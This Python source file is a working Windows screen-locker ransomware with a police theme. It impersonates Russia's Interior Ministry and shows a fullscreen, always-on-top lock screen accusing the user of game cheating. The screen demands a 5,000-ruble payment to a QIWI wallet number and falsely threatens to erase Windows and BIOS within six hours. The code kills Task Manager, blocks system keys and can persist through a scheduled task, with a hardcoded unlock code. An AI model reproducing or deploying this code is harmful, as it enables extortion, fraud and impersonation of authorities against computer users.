from tkinter import *
from tkinter import ttk
import getpass
import sys
import os
import psutil
import signal
import pyautogui
import subprocess
import keyboard
import datetime
import pygame
import threading
import time
from PIL import Image, ImageTk

def init_audio():
    pygame.mixer.init(frequency=44100, size=-16, channels=2, buffer=4096)
    return True

def play_police_siren():
    sound_file = "assets/siren.mp3"
    
    pygame.mixer.music.load(sound_file)
    pygame.mixer.music.set_volume(0.4)
    pygame.mixer.music.play(loops=1)
    
    time.sleep(3)
    
    fadeout_duration = 3000
    pygame.mixer.music.fadeout(fadeout_duration)
    
    time.sleep(fadeout_duration / 1000 + 0.1)
    
    pygame.mixer.music.stop()
    
    return True
        

def start_siren():
    if init_audio():
        siren_thread = threading.Thread(target=play_police_siren, daemon=True)
        siren_thread.start()
    else:
        pass

start_siren()

USER_NAME = getpass.getuser()

if getattr(sys, 'frozen', False):
    APP_PATH = sys.executable
else:
    APP_PATH = os.path.abspath(__file__)

TASK_NAME = "MVD_BlockTask"

def create_task():
    command = f'schtasks /create /tn "{TASK_NAME}" /tr "{APP_PATH}" /sc onlogon /rl highest /f'
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при создании задачи: {e}")

def delete_task():
    command = f'schtasks /delete /tn "{TASK_NAME}" /f'
    try:
        subprocess.run(command, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при удалении задачи: {e}")

def monitor_taskmgr():
    for proc in psutil.process_iter(['name', 'pid']):
        try:
            if proc.info['name'] and proc.info['name'].lower() == 'taskmgr.exe':
                os.kill(proc.info['pid'], signal.SIGTERM)
        except Exception:
            pass
    window.after(1000, monitor_taskmgr)

window = Tk()
window.title("")
window['bg'] = '#000033'
window.attributes('-fullscreen', True, '-topmost', True)

screen_width = window.winfo_screenwidth()
screen_height = window.winfo_screenheight()

if screen_height < 768:
    scale_factor = 0.7
    font_base = 10
elif screen_height < 1080:
    scale_factor = 0.8
    font_base = 12
else:
    scale_factor = 0.9
    font_base = 14

fontsize_small = max(int(font_base * scale_factor), 16)
fontsize = max(int(font_base * 1.2 * scale_factor), 16)
fontsize_large = max(int(font_base * 1.5 * scale_factor), 24)

bg_color = '#000033'
text_color = '#FFFFFF'
accent_color = '#FF0000'
highlight_color = '#FFFF00'
button_color = '#3366CC'

window.configure(bg=bg_color)

main_container = Frame(window, bg=bg_color)
main_container.pack(fill=BOTH, expand=True)

canvas = Canvas(main_container, bg=bg_color, highlightthickness=0)
scrollbar = Scrollbar(main_container, orient="vertical", command=canvas.yview)

scrollbar.configure(width=0)
scrollbar.pack_forget()

content_frame = Frame(canvas, bg=bg_color)

center_frame = Frame(content_frame, bg=bg_color)
center_frame.pack(expand=True, fill=BOTH)

def configure_canvas(event):
    canvas.configure(scrollregion=canvas.bbox("all"))
    
    canvas_width = canvas.winfo_width()
    content_width = content_frame.winfo_reqwidth()
    
    if content_width < canvas_width:
        x = (canvas_width - content_width) // 2
        canvas.coords(canvas_window, x, 0)
    else:
        canvas.coords(canvas_window, 0, 0)

canvas_window = canvas.create_window((0, 0), window=content_frame, anchor="nw")
canvas.configure(yscrollcommand=scrollbar.set)

canvas.pack(side="left", fill="both", expand=True)

canvas.bind('<Configure>', configure_canvas)
content_frame.bind("<Configure>", configure_canvas)

inner_width = min(1400, screen_width * 0.85)
inner_frame = Frame(center_frame, bg=bg_color, width=inner_width)
inner_frame.pack(expand=True)

logo_frame = Frame(inner_frame, bg=bg_color)
logo_frame.pack(pady=(10, 15))
img = Image.open("assets/mia.png")

max_logo_width = min(300, int(screen_width * 0.2))
original_width, original_height = img.size

if original_width > max_logo_width:
    ratio = max_logo_width / original_width
    new_width = max_logo_width
    new_height = int(original_height * ratio)
else:
    new_width = original_width
    new_height = original_height

img = img.resize((new_width, new_height), Image.Resampling.LANCZOS)

logo_img = ImageTk.PhotoImage(img)

logo_label = Label(logo_frame, 
                    image=logo_img, 
                    bg=bg_color)
logo_label.image = logo_img
logo_label.pack()

header_text = "МИНИСТЕРСТВО ВНУТРЕННИХ ДЕЛ РОССИЙСКОЙ ФЕДЕРАЦИИ"
header_label = Label(inner_frame,
                     text=header_text,
                     font=("Arial", fontsize_large, "bold"),
                     fg=accent_color,
                     bg=bg_color)
header_label.pack(pady=(20, 10))

case_text = f"Управление по организации борьбы с противоправным использованием\nинформационно-коммуникационных технологий"
case_label = Label(inner_frame,
                   text=case_text,
                   font=("Arial", fontsize, "bold"),
                   fg=highlight_color,
                   bg=bg_color)
case_label.pack(pady=(0, 20))

logo_label.pack()

reason_frame = Frame(inner_frame, bg=bg_color)
reason_frame.pack(pady=(0, 15), fill=X, padx=20)

reason_text = """ВАШ КОМПЬЮТЕР ЗАБЛОКИРОВАН!

ПРИЧИНА: ПРОТИВОПРАВНАЯ ДЕЯТЕЛЬНОСТЬ В СФЕРЕ ИГРОВОЙ ИНДУСТРИИ 
    - Разработка, хранение и использование читерского ПО (читы, боты, макросы)
    - Использование программ для получения преимущества в онлайн-играх
    - Участие в схемах по взлому игровых аккаунтов и краже виртуального имущества
    - Использование средств для скрытия цифровых следов

Статьи 273, 274 УК РФ, 20.29 КоАП РФ
Доступ ограничен до оплаты административного штрафа."""

reason_label = Label(reason_frame,
                     text=reason_text,
                     font=("Arial", fontsize),
                     fg=text_color,
                     bg=bg_color,
                     justify=LEFT,
                     anchor='w',
                     wraplength=inner_width-40)
reason_label.pack()

separator = Frame(inner_frame, height=2, bg=accent_color)
separator.pack(fill=X, pady=15, padx=20)

instruction_header = Label(inner_frame,
                           text="ИНСТРУКЦИЯ ПО ОПЛАТЕ ШТРАФА:",
                           font=("Arial", fontsize, "bold"),
                           fg=highlight_color,
                           bg=bg_color)
instruction_header.pack(pady=(0, 10), anchor='center') 

instruction_text = """В соответствии со ст. 32.2 КоАП РФ, вы имеете право оплатить административный штраф 
в размере 5.000 рублей в течение 60 дней с момента получения постановления.

ИНСТРУКЦИЯ ПО ОПЛАТЕ ШТРАФА:
1. Найдите ближайший терминал для оплаты мобильной связи QIWI "ОСМП".
2. Выберите язык меню: русский. Войдите в раздел "Оплата услуг".
3. Нажмите "Электронная коммерция" и выберите "QIWI Кошелёк".
4. Введите номер счета: +7(914)707-93-83
5. Внесите купюры в купюроприемник, подтвердите платеж и возьмите квитанцию."""

instruction_label = Label(inner_frame,
                         text=instruction_text,
                         font=("Arial", fontsize),
                         fg=text_color,
                         bg=bg_color,
                         justify=LEFT,
                         anchor='w')
instruction_label.pack(pady=(0, 20), padx=40)


info_text = """После оплаты введите код с квитанции.
При верном коде блокировка будет снята, а ваше дело удалено из архивов МВД РФ"""

info_label = Label(inner_frame,
                   text=info_text,
                   font=("Arial", fontsize),
                   fg=text_color,
                   bg=bg_color,
                   justify=CENTER)
info_label.pack(pady=(0, 20))

keyboard_frame = Frame(inner_frame, bg=bg_color)
keyboard_frame.pack(pady=(0, 20))

keyboard_buttons = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "<---"]

for key in keyboard_buttons:
    btn = Button(keyboard_frame,
                 text=key,
                 font=("Arial", fontsize),
                 bg=button_color,
                 fg=text_color,
                 relief=RAISED,
                 bd=3,
                 padx=20,
                 pady=10,
                 activebackground='#4477DD',
                 activeforeground=text_color,
                 command=lambda k=key: add_digit(k))
    btn.pack(side=LEFT, padx=5)

input_frame = Frame(inner_frame, bg=bg_color)
input_frame.pack(pady=20)

code_label = Label(input_frame,
                   text="Код:",
                   font=("Arial", fontsize, "bold"),
                   fg=text_color,
                   bg=bg_color)
code_label.pack(side=LEFT, padx=(0, 10))

code_var = StringVar()

code_entry = Entry(input_frame,
                   textvariable=code_var,
                   font=("Arial", fontsize, "bold"),
                   bg='#111111',
                   fg=highlight_color,
                   insertbackground=highlight_color,
                   relief=SUNKEN,
                   bd=2,
                   width=12,
                   justify=CENTER,
                   show="*")
code_entry.pack(side=LEFT, padx=(0, 15))

def add_digit(digit):
    if digit == "<---":
        current = code_var.get()
        code_var.set(current[:-1])
    else:
        current = code_var.get()
        if len(current) < 6:
            code_var.set(current + digit)

    code_entry.focus_set()
    code_entry.icursor(END)

for row_frame in keyboard_frame.winfo_children():
    for btn in row_frame.winfo_children():
        digit = btn.cget("text")
        btn.config(command=lambda d=digit: add_digit(d))

def unlock_computer():
    entered_code = code_var.get()
    if entered_code == "123456":
        delete_task()
        window.destroy()
        sys.exit()
    else:
        error_label.config(text="НЕВЕРНЫЙ КОД!")
        code_var.set("")
        window.after(3000, lambda: error_label.config(text=""))

unlock_btn = Button(input_frame,
                    text="РАЗБЛОКИРОВАТЬ",
                    font=("Arial", fontsize, "bold"),
                    bg=accent_color,
                    fg=text_color,
                    relief=RAISED,
                    bd=2,
                    padx=20,
                    pady=5,
                    command=unlock_computer,
                    activebackground='#FF3333',
                    activeforeground=text_color)
unlock_btn.pack(side=LEFT)

error_label = Label(inner_frame,
                    text="",
                    font=("Arial", fontsize_small),
                    fg=accent_color,
                    bg=bg_color)
error_label.pack(pady=(10, 0))

separator2 = Frame(inner_frame, height=2, bg=accent_color)
separator2.pack(fill=X, pady=15, padx=20)

warning_text = """ВАЖНО: Если в течение 6 часов с момента появления данного сообщения, 
не будет введён код, все данные включая WINDOWS и BIOS будут БЕЗВОЗВРАТНО УДАЛЕНЫ! 
Попытка переустановить систему приведёт к нарушениям работы компьютера."""

warning_label = Label(inner_frame,
                      text=warning_text,
                      font=("Arial", fontsize_small),
                      fg=accent_color,
                      bg=bg_color,
                      justify=CENTER)
warning_label.pack(pady=(0, 20), padx=20)

timer_frame = Frame(inner_frame, bg=bg_color)
timer_frame.pack(pady=(0, 30))

start_time = datetime.datetime.now()
end_time = start_time + datetime.timedelta(hours=6)

def update_timer():
    current_time = datetime.datetime.now()
    time_left = end_time - current_time
    
    if time_left.total_seconds() <= 0:
        timer_label.config(text="ВРЕМЯ ВЫШЛО!")
    else:
        hours = time_left.seconds // 3600
        minutes = (time_left.seconds % 3600) // 60
        seconds = time_left.seconds % 60
        timer_label.config(text=f"Осталось: {hours:02d}:{minutes:02d}:{seconds:02d}")
    
    window.after(1000, update_timer)

timer_label = Label(timer_frame,
                    text="Осталось: 06:00:00",
                    font=("Arial", fontsize, "bold"),
                    fg=accent_color,
                    bg=bg_color)
timer_label.pack()

def set_focus():
    code_entry.focus_set()
window.after(100, set_focus)

def block_close():
    pass

def block_keys(event=None):
    return "break"

def keep_on_top():
    window.lift()
    window.attributes('-topmost', True)
    window.after(500, keep_on_top)

window.protocol("WM_DELETE_WINDOW", block_close)
window.bind_all("<Alt-F4>", block_keys)
window.bind_all("<Control-Escape>", block_keys)
window.bind_all("<Alt-Tab>", block_keys)
window.bind_all("<Win_L>", block_keys)
window.bind_all("<Win_R>", block_keys)

try:
    keyboard.block_key('windows')
    keyboard.block_key('d')
    keyboard.block_key('tab')
    keyboard.block_key('ctrl')
    keyboard.block_key('alt')
    keyboard.block_key('esc')
except Exception as e:
    pass

window.bind('<Return>', lambda event: unlock_computer())

def on_mouse_wheel(event):
    canvas.yview_scroll(int(-1*(event.delta/120)), "units")
    
canvas.bind_all("<MouseWheel>", on_mouse_wheel)

def scroll_up(event):
    canvas.yview_scroll(-1, "units")
def scroll_down(event):
    canvas.yview_scroll(1, "units")
window.bind("<Up>", scroll_up)
window.bind("<Down>", scroll_down)

def page_up(event):
    canvas.yview_scroll(-10, "units")
def page_down(event):
    canvas.yview_scroll(10, "units")
window.bind("<Prior>", page_up)
window.bind("<Next>", page_down)

# create_task()
monitor_taskmgr()
keep_on_top()
update_timer()

def update_centering():
    canvas_width = canvas.winfo_width()
    content_width = content_frame.winfo_reqwidth()
    
    if content_width < canvas_width:
        x = (canvas_width - content_width) // 2
        canvas.coords(canvas_window, x, 0)
    else:
        canvas.coords(canvas_window, 20, 0)
    
    window.after(100, update_centering)

# update_centering()

window.mainloop()